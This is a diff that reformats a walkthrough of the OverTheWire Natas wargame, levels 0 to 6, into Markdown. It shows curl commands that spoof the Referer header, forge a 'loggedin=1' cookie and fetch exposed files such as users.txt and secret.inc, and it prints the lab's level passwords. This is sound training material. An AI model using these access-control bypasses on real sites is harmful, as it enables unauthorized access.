@@ -1,209 +1,178 @@
-natas0:
-	1. Visit http://natas0.natas.labs.overthewire.org
-	2. We're prompted with an Authentication dialog.
-	3. Login with "natas0:natas0" (login found here: http://overthewire.org/wargames/natas/)
-	4. We see "You can find the password for the next level on this page."
-	5. $ curl http://natas0:natas0@natas0.natas.labs.overthewire.org/
-		<html>
-		<head>
-		<!-- This stuff in the header has nothing to do with the level -->
-		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
-		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
-		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
-		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
-		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
-		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
-		<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
-		<body>
-		<h1>natas0</h1>
-		<div id="content">
-		You can find the password for the next level on this page.
-		<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
-		</div>
-		</body>
-		</html>
-natas1:
-	1. Visit http://natas1.natas.labs.overthewire.org
-	2. We're prompted with an Authentication dialog.
-	3. Login with "natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto"
-	4. Same deal, "You can find the password for the next level on this page, but rightclicking has been blocked!"
-	5. $ curl http://natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto@natas1.natas.labs.overthewire.org/
-		<html>
-		<head>
-		<!-- This stuff in the header has nothing to do with the level -->
-		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
-		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
-		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
-		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
-		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
-		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
-		<script>var wechallinfo = { "level": "natas1", "pass": "gtVrDuiDfck831PqWsLEZy5gyDz1clto" };</script></head>
-		<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
-		<h1>natas1</h1>
-		<div id="content">
-		You can find the password for the
-		next level on this page, but rightclicking has been blocked!
+# natas0:
+1. Visit http://natas0.natas.labs.overthewire.org
+2. We're prompted with an Authentication dialog.
+3. Login with "natas0:natas0" (login found here: http://overthewire.org/wargames/natas/)
+4. We see "You can find the password for the next level on this page."
+5. ```bash
+$ curl http://natas0:natas0@natas0.natas.labs.overthewire.org/
+You can find the password for the next level on this page.
+<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+```
 
-		<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
-		</div>
-		</body>
-		</html>
-natas2:
-	1. Visit http://natas2.natas.labs.overthewire.org
-	2. We're prompted with an Authentication dialog.
-	3. Login with "natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
-	4. "There is nothing on this page" So, let's check source.
-	   $ curl http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/
-	   	<html>
-	   	<head>
-	   	<!-- This stuff in the header has nothing to do with the level -->
-	   	<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
-	   	<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
-	   	<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
-	   	<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
-	   	<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
-	   	<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
-	   	<script>var wechallinfo = { "level": "natas2", "pass": "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi" };</script></head>
-	   	<body>
-	   	<h1>natas2</h1>
-	   	<div id="content">
-	   	There is nothing on this page
-	   	<img src="files/pixel.png">
-	   	</div>
-	   	</body></html>
-	5. Hmm, I wonder what's in "/files" directory? http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/files/
-	6. We see "pixel.png" and "users.txt", let's see http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/files/users.txt
-		# username:password
-		alice:BYNdCesZqW
-		bob:jw2ueICLvT
-		charlie:G5vCxkVV3m
-		natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
-		eve:zo4mJWyNj2
-		mallory:9urtcpzBmH
-natas3:
-	1. Visit http://natas3.natas.labs.overthewire.org
-	2. We're prompted with an Authentication dialog.
-	3. Login with "natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
-	4. http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org
-	5. $ curl http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/
-		...
-		<div id="content">
-		There is nothing on this page
-		<!-- No more information leaks!! Not even Google will find it this time... -->
-		</div>
-		...
-	6. hmm, google you say?
-	   $ curl http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/robots.txt
-	   	User-agent: *
-	   	Disallow: /s3cr3t/
-	7. http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/s3cr3t/ we see "users.txt" again
-	8. http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/s3cr3t/users.txt
-		natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
-natas4:
-	1. Visit http://natas4.natas.labs.overthewire.org
-	2. We're prompted with an Authentication dialog.
-	3. Login with "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
-	4. http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org
-		"Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" "
-	5. Let's spoof our "Referer" header
-	   $ curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org
-	   	...
-	   	<div id="content">
-	   	Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
-	   	<br/>
-	   	<div id="viewsource"><a href="index.php">Refresh page</a></div>
-	   	</div>
-	   	...
-natas5:
-	1. Visit http://natas5.natas.labs.overthewire.org
-	2. We're prompted with an Authentication dialog.
-	3. Login with "natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
-	4. $ curl http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
-		...
-		<div id="content">
-		Access disallowed. You are not logged in</div>
-		...
-	5. $ curl -v http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
-		> GET / HTTP/1.1
-		> Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
-		> User-Agent: curl/7.37.1
-		> Host: natas5.natas.labs.overthewire.org
-		> Accept: */*
-		>
-		< HTTP/1.1 200 OK
-		< Date: Thu, 16 Jul 2015 16:18:33 GMT
-		* Server Apache/2.4.7 (Ubuntu) is not blacklisted
-		< Server: Apache/2.4.7 (Ubuntu)
-		< X-Powered-By: PHP/5.5.9-1ubuntu4.11
-		< Set-Cookie: loggedin=0
-		< Vary: Accept-Encoding
-		< Content-Length: 855
-		< Content-Type: text/html
-		<
-		<html>
-		<head>
-		<!-- This stuff in the header has nothing to do with the level -->
-		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
-		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
-		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
-		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
-		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
-		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
-		<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
-		<body>
-		<h1>natas5</h1>
-		<div id="content">
-		Access disallowed. You are not logged in</div>
-		</body>
-		</html>
-	6. Set-Cookie: loggedin=0 .. let's override this!
-	   $ curl -b "loggedin=1" http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
-	   	...
-	   	<div id="content">
-	   	Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
-	   	...
-natas6:
-	1. Visit http://natas6.natas.labs.overthewire.org
-	2. We're prompted with an Authentication dialog.
-	3. Login with "natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
-	4. $ curl http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org
-		...
-		<div id="content">
-			<form method=post>
-				Input secret: <input name=secret><br>
-				<input type=submit name=submit>
-			</form>
-			<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
-		</div>
-		...
-	5. not much to work with here, let's check that index-source.html
-	  Visit: http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/index-source.html
-	  	...
-	  	<div id="content">
-	  	<?
-	  		include "includes/secret.inc";
-	  	    if(array_key_exists("submit", $_POST)) {
-	  	        if($secret == $_POST['secret']) {
-		  	        print "Access granted. The password for natas7 is <censored>";
-		  	    } else {
-		  	        print "Wrong secret";
-		  	    }
-	  	    }
-	  	?>
-	  	<form method=post>
-		  	Input secret: <input name=secret><br>
-		  	<input type=submit name=submit>
-	  	</form>
-	  	<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
-	  	...
-	6. $ curl http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/includes/secret.inc
-		<?
-		$secret = "FOEIUWGHFEEUHOFUOIU";
-		?>
-	7. $ curl -d "secret=FOEIUWGHFEEUHOFUOIU&submit=" http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/
-		...
-		Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
-		...
+# natas1:
+1. Visit http://natas1.natas.labs.overthewire.org
+2. We're prompted with an Authentication dialog.
+3. Login with "natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto"
+4. Same deal, "You can find the password for the next level on this page, but rightclicking has been blocked!"
+5. ```bash
+$ curl http://natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto@natas1.natas.labs.overthewire.org/
+You can find the password for the next level on this page, but right clicking has been blocked!
+<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+```
+
+# natas2:
+1. Visit http://natas2.natas.labs.overthewire.org
+2. We're prompted with an Authentication dialog.
+3. Login with "natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
+4. "There is nothing on this page" So, let's check source.
+5. ```bash
+$ curl http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/
+There is nothing on this page
+<img src="files/pixel.png">
+```
+5. Hmm, I wonder what's in "/files" directory? http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/files/
+6. We see "pixel.png" and "users.txt", let's see http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/files/users.txt
+```text
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+```
+
+# natas3:
+1. Visit http://natas3.natas.labs.overthewire.org
+2. We're prompted with an Authentication dialog.
+3. Login with "natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
+4. http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org
+5. ```bash
+$ curl http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/
+There is nothing on this page
+<!-- No more information leaks!! Not even Google will find it this time... -->
+```
+6. hmm, google you say?
+```bash
+$ curl http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/robots.txt
+User-agent: *
+Disallow: /s3cr3t/
+```
+7. http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/s3cr3t/ we see "users.txt" again
+8. http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+```text
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+```
+
+# natas4:
+1. Visit http://natas4.natas.labs.overthewire.org
+2. We're prompted with an Authentication dialog.
+3. Login with "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
+4. http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org
+```html
+Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+```
+5. Let's spoof our "Referer" header
+```bash
+$ curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+```
+
+# natas5:
+1. Visit http://natas5.natas.labs.overthewire.org
+2. We're prompted with an Authentication dialog.
+3. Login with "natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
+4. ```bash
+$ curl http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
+Access disallowed. You are not logged in</div>
+```
+5. ```bash
+$ curl -v http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
+    > GET / HTTP/1.1
+    > Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
+    > User-Agent: curl/7.37.1
+    > Host: natas5.natas.labs.overthewire.org
+    > Accept: */*
+    >
+    < HTTP/1.1 200 OK
+    < Date: Thu, 16 Jul 2015 16:18:33 GMT
+    * Server Apache/2.4.7 (Ubuntu) is not blacklisted
+    < Server: Apache/2.4.7 (Ubuntu)
+    < X-Powered-By: PHP/5.5.9-1ubuntu4.11
+    < Set-Cookie: loggedin=0
+    < Vary: Accept-Encoding
+    < Content-Length: 855
+    < Content-Type: text/html
+    <
+    <html>
+    <head>
+    <!-- This stuff in the header has nothing to do with the level -->
+    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+    <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+    <script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
+    <body>
+    <h1>natas5</h1>
+    <div id="content">
+    Access disallowed. You are not logged in</div>
+    </body>
+    </html>
+```
+6. Set-Cookie: loggedin=0 .. let's override this!
+```bash
+$ curl -b "loggedin=1" http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+```
+
+# natas6:
+1. Visit http://natas6.natas.labs.overthewire.org
+2. We're prompted with an Authentication dialog.
+3. Login with "natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
+4. ```bash
+$ curl http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org
+<div id="content">
+	<form method=post>
+		Input secret: <input name=secret><br>
+		<input type=submit name=submit>
+	</form>
+	<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+5. not much to work with here, let's check http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/index-source.html
+```php
+<div id="content">
+<?
+	include "includes/secret.inc";
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+	        print "Access granted. The password for natas7 is <censored>";
+	    } else {
+	        print "Wrong secret";
+	    }
+    }
+?>
+<form method=post>
+	Input secret: <input name=secret><br>
+	<input type=submit name=submit>
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+6. ```bash
+$ curl http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/includes/secret.inc
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+```
+7. ```bash
+$ curl -d "secret=FOEIUWGHFEEUHOFUOIU&submit=" http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/
+Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+```
+
+---
+
 natas7:
 	1. Visit http://natas7.natas.labs.overthewire.org
 	2. We're prompted with an Authentication dialog.
